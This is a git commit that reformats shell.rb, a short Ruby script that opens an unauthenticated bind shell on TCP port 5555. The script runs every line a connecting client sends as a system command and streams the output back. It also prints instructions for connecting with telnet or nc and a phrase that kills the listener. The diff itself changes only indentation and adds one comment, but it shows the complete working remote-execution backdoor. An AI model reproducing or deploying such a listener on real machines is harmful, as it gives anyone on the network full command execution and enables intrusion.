a9776d6b94527693ce62f80ebc30c6665e345bc1
John Woods <zenbanjoman@gmail.com>
2013-02-06 13:55:13 -0600

    formating changes

--- shell.rb
+++ shell.rb
@@ -2,19 +2,21 @@
 
 require 'socket'
 require 'open3'
+
+#The number over loop is the port number the shell listens on.
 Socket.tcp_server_loop(5555) do |sock, client_addrinfo|
   begin
-	while command = sock.gets
-		Open3.popen2e("#{command}") do | stdin, stdout_and_stderr |
-			IO.copy_stream(stdout_and_stderr, sock)
-			end  
-	    end
+  while command = sock.gets
+    Open3.popen2e("#{command}") do | stdin, stdout_and_stderr |
+      IO.copy_stream(stdout_and_stderr, sock)
+      end  
+      end
    rescue
-	break if command =~ /IQuit!/
-	sock.write "Command or file not found.\n"
-	sock.write "Type IQuit! to kill the shell forever on the server.\n"
-	sock.write "Use ^] or ctl+C (telnet or nc) to exit and keep it open.\n"
-	retry
+  break if command =~ /IQuit!/
+  sock.write "Command or file not found.\n"
+  sock.write "Type IQuit! to kill the shell forever on the server.\n"
+  sock.write "Use ^] or ctl+C (telnet or nc) to exit and keep it open.\n"
+  retry
    ensure
      sock.close
   end
